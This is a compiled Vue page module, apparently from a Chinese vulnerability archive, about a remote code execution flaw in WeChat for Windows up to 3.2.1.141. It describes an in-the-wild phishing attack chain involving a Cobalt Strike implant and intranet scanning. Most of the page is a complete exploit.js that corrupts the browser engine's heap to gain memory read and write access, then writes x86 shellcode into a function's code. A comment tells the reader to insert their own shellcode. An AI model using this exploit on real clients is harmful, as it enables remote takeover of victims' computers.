import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as v,c as a,a as i,b as n,d as s,e as d}from"./app-58e4a7d6.js";const t={},c=i("h2",{id:"漏洞描述",tabindex:"-1"},[i("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=i("p",null,"微信客户端存在远程命令执行漏洞。目前已经发现在野利用，受害者点击链接就会中招，微信Windows PC版进程webchatweb.exe会加载shellcode执行，整个过程无文件落地，无新进程产生，攻击者可以直接获取目标机器权限。",-1),b=i("p",null,"参考链接：",-1),m={href:"https://mp.weixin.qq.com/s/OfPNr-l_9kzl1MdE7DSHHQ",target:"_blank",rel:"noopener noreferrer"},o=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>微信Windows版 &lt;=3.2.1.141 截止2022年12月最新版为3.8.0.41
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,3),_={href:"https://mp.weixin.qq.com/s/OfPNr-l_9kzl1MdE7DSHHQ",target:"_blank",rel:"noopener noreferrer"},f=d(`<ol><li>攻击者利用微信（PC版）0day构造恶意的钓鱼链接，通过微信将钓鱼链接发送给目标员工。</li><li>当员工打开攻击者的钓鱼链接时触发该漏洞，从而导致目标员工PC被植入攻击者制作的cobalstrike木马，木马进程为：xxxsoft.exe，同时创建了名为dotnet_v4.3的系统服务。</li><li>随后，攻击者进一步在c:\\ProgramData\\目录下放置TxPortMap.exe 扫描工具并利用该工具扫描目标单位内网。</li></ol><p>exploit.js：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ENABLE_LOG = true;
IN_WORKER = true;

// run calc and hang in a loop
var shellcode = [#shellcode];//shellcode替换成自己的 注意是x86的

function print(data) {
}


var not_optimised_out = 0;
var target_function = (function (value) {
    if (value == 0xdecaf0) {
        not_optimised_out += 1;
    }
    not_optimised_out += 1;
    not_optimised_out |= 0xff;
    not_optimised_out *= 12;
});

for (var i = 0; i &lt; 0x10000; ++i) {
    target_function(i);
}


var g_array;
var tDerivedNCount = 17 * 87481 - 8;
var tDerivedNDepth = 19 * 19;

function cb(flag) {
    if (flag == true) {
        return;
    }
    g_array = new Array(0);
    g_array[0] = 0x1dbabe * 2;
    return &#39;c01db33f&#39;;
}

function gc() {
    for (var i = 0; i &lt; 0x10000; ++i) {
        new String();
    }
}

function oobAccess() {
    var this_ = this;
    this.buffer = null;
    this.buffer_view = null;

    this.page_buffer = null;
    this.page_view = null;

    this.prevent_opt = [];

    var kSlotOffset = 0x1f;
    var kBackingStoreOffset = 0xf;

    class LeakArrayBuffer extends ArrayBuffer {
        constructor() {
            super(0x1000);
            this.slot = this;
        }
    }

    this.page_buffer = new LeakArrayBuffer();
    this.page_view = new DataView(this.page_buffer);

    new RegExp({ toString: function () { return &#39;a&#39; } });
    cb(true);

    class DerivedBase extends RegExp {
        constructor() {
            // var array = null;
            super(
                // at this point, the 4-byte allocation for the JSRegExp \`this\` object
                // has just happened.
                {
                    toString: cb
                }, &#39;g&#39;
                // now the runtime JSRegExp constructor is called, corrupting the
                // JSArray.
            );

            // this allocation will now directly follow the FixedArray allocation
            // made for \`this.data\`, which is where \`array.elements\` points to.
            this_.buffer = new ArrayBuffer(0x80);
            g_array[8] = this_.page_buffer;
        }
    }

    // try{
    var derived_n = eval(\`(function derived_n(i) {
        if (i == 0) {
            return DerivedBase;
        }

        class DerivedN extends derived_n(i-1) {
            constructor() {
                super();
                return;
                \${&quot;this.a=0;&quot;.repeat(tDerivedNCount)}
            }
        }

        return DerivedN;
    })\`);

    gc();


    new (derived_n(tDerivedNDepth))();

    this.buffer_view = new DataView(this.buffer);
    this.leakPtr = function (obj) {
        this.page_buffer.slot = obj;
        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
    }

    this.setPtr = function (addr) {
        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
    }

    this.read32 = function (addr) {
        this.setPtr(addr);
        return this.page_view.getUint32(0, true, ...this.prevent_opt);
    }

    this.write32 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
    }

    this.write8 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }

    this.setBytes = function (addr, content) {
        for (var i = 0; i &lt; content.length; i++) {
            this.write8(addr + i, content[i]);
        }
    }
    return this;
}

function trigger() {
    var oob = oobAccess();

    var func_ptr = oob.leakPtr(target_function);
    print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16));

    var kCodeInsOffset = 0x1b;

    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
    print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16));

    oob.setBytes(code_addr, shellcode);

    target_function(0);
}

try{
    print(&quot;start running&quot;);
    trigger();
}catch(e){
    print(e);
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3);function h(p,g){const e=r("ExternalLinkIcon");return v(),a("div",null,[c,u,b,i("ul",null,[i("li",null,[i("a",m,[n("https://mp.weixin.qq.com/s/OfPNr-l_9kzl1MdE7DSHHQ"),s(e)])])]),o,i("p",null,[i("a",_,[n("安恒信息应急响应中心"),s(e)]),n("分析的攻击链：")]),f])}const k=l(t,[["render",h],["__file","微信客户端 远程命令执行漏洞.html.vue"]]);export{k as default};
